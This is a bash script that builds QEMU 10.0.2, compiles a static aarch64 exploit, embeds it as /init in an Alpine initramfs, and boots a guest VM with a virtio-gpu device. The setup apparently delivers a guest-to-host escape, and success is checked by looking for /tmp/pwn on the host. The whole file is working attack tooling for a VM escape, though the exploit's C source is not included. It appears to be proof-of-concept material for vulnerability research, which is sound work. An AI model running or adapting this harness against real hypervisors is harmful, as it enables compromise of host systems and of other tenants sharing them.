#!/bin/bash
#
# run_poc_linux.sh — Build QEMU 10.0.2 and prepare a guest VM for the
# virtio-gpu exploit on Linux aarch64.
#
# Prerequisites:
#   - Linux aarch64 host (Debian bookworm or similar)
#   - Build dependencies: gcc, meson, ninja, pkg-config,
#     libglib2.0-dev, libpixman-1-dev, libslirp-dev, flex, bison
#   - aarch64-linux-gnu-gcc (or native gcc for static guest binary)
#
# Usage:
#   ./run_poc_linux.sh          # build everything
#   ./run_poc_linux.sh run      # run the VM (after building)
#
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
WORK_DIR="/tmp/qemu-exploit"
QEMU_VER="10.0.2"
QEMU_URL="https://download.qemu.org/qemu-${QEMU_VER}.tar.xz"
QEMU_BIN="$WORK_DIR/qemu-${QEMU_VER}/build-exploit/qemu-system-aarch64"

# Ensure meson/ninja are on PATH (pip-installed location)
for d in \
    /home/node/.local/share/uv/python/cpython-3.13.12-linux-aarch64-gnu/bin \
    "$HOME/.local/bin"; do
    [ -d "$d" ] && export PATH="$d:$PATH"
done

mkdir -p "$WORK_DIR"

# ---------- Step 1: Build QEMU ----------

build_qemu() {
    echo "=== Building QEMU ${QEMU_VER} ==="
    cd "$WORK_DIR"

    if [ ! -f "qemu-${QEMU_VER}.tar.xz" ]; then
        echo "Downloading QEMU source..."
        wget -q "$QEMU_URL"
    fi

    if [ ! -d "qemu-${QEMU_VER}" ]; then
        echo "Extracting..."
        tar xf "qemu-${QEMU_VER}.tar.xz"
    fi

    cd "qemu-${QEMU_VER}"

    # Check if already built (binary exists, not just the directory)
    if [ -x "build-exploit/qemu-system-aarch64" ]; then
        echo "QEMU already built."
        echo "QEMU binary: $QEMU_BIN"
        return
    fi

    # Clean up any failed prior attempt
    rm -rf build-exploit
    mkdir build-exploit
    cd build-exploit

    echo "Configuring..."
    ../configure \
        --target-list=aarch64-softmmu \
        --enable-kvm \
        --enable-vnc \
        --enable-slirp \
        --disable-docs \
        --disable-werror

    echo "Building (this may take a few minutes)..."
    ninja -j"$(nproc)"

    echo "QEMU binary: $QEMU_BIN"
}

# ---------- Step 2: Build the exploit ----------

build_exploit() {
    echo "=== Building exploit ==="
    cd "$SCRIPT_DIR"

    # Try native gcc first (if on aarch64), then cross-compiler
    if command -v aarch64-linux-gnu-gcc &>/dev/null; then
        CC=aarch64-linux-gnu-gcc
    elif [ "$(uname -m)" = "aarch64" ]; then
        CC=gcc
    else
        echo "ERROR: No aarch64 compiler found"
        exit 1
    fi

    $CC -static -O2 -o exploit_linux exploit_linux.c
    echo "Exploit binary: $SCRIPT_DIR/exploit_linux"
}

# ---------- Step 3: Prepare guest initramfs ----------

prepare_guest() {
    echo "=== Preparing guest VM ==="
    cd "$WORK_DIR"

    # Download matching Alpine kernel + initramfs (must be same version for modules)
    ALPINE_BASE_URL="https://dl-cdn.alpinelinux.org/alpine/v3.21/releases/aarch64/netboot"
    VMLINUZ="$WORK_DIR/vmlinuz-alpine"
    ALPINE_INITRAMFS="$WORK_DIR/initramfs-alpine"

    if [ ! -f "$VMLINUZ" ]; then
        echo "Downloading Alpine kernel..."
        wget -q -O "$VMLINUZ" "$ALPINE_BASE_URL/vmlinuz-virt"
    fi
    if [ ! -f "$ALPINE_INITRAMFS" ]; then
        echo "Downloading Alpine initramfs (for busybox + modules)..."
        wget -q -O "$ALPINE_INITRAMFS" "$ALPINE_BASE_URL/initramfs-virt"
    fi

    # Build initramfs: extract Alpine base, overlay exploit as /init
    INITRAMFS_DIR="$WORK_DIR/initramfs_mod"
    rm -rf "$INITRAMFS_DIR"
    mkdir -p "$INITRAMFS_DIR"
    cd "$INITRAMFS_DIR"

    echo "Extracting Alpine initramfs..."
    gunzip -c "$ALPINE_INITRAMFS" | cpio -id 2>/dev/null || true

    # The exploit binary IS /init — it detects PID 1 and sets up
    # mounts, loads modules, configures networking, then runs the exploit.
    cp "$SCRIPT_DIR/exploit_linux" init
    chmod +x init

    # Pack the initramfs
    echo "Packing initramfs..."
    find . | cpio -o -H newc 2>/dev/null | gzip > "$WORK_DIR/initramfs-exploit.gz"
    echo "Initramfs: $WORK_DIR/initramfs-exploit.gz ($(du -h "$WORK_DIR/initramfs-exploit.gz" | cut -f1))"
    echo "Kernel:    $VMLINUZ"
}

# ---------- Step 4: Run the VM ----------

run_vm() {
    VMLINUZ="$WORK_DIR/vmlinuz-alpine"
    INITRD="$WORK_DIR/initramfs-exploit.gz"

    if [ ! -x "$QEMU_BIN" ]; then
        echo "ERROR: QEMU not built. Run: $0"
        exit 1
    fi
    if [ ! -f "$INITRD" ]; then
        echo "ERROR: initramfs not built. Run: $0"
        exit 1
    fi

    # Kill any stale QEMU from a previous run
    pkill -9 -f "qemu-system-aarch64" 2>/dev/null || true
    sleep 2

    echo "=== Running exploit VM ==="
    echo "VNC server on :0 (port 5900)"
    echo ""

    "$QEMU_BIN" \
        -accel kvm \
        -M virt \
        -cpu host \
        -m 512 \
        -kernel "$VMLINUZ" \
        -initrd "$INITRD" \
        -append "console=ttyAMA0 iommu.passthrough=1 rdinit=/init" \
        -device virtio-gpu-pci \
        -nic user,model=virtio-net-pci \
        -vnc :0 -display none \
        -chardev file,id=ser0,path=/tmp/qemu_serial.log \
        -serial chardev:ser0 \
        -no-reboot
}

# ---------- Main ----------

if [ "${1:-}" = "run" ]; then
    run_vm
else
    build_qemu
    build_exploit
    prepare_guest
    echo ""
    echo "=== Build complete ==="
    echo "Run the exploit VM with: $0 run"
    echo ""
    echo "After ~30 seconds, check the host for /tmp/pwn:"
    echo "  ls -la /tmp/pwn"
fi
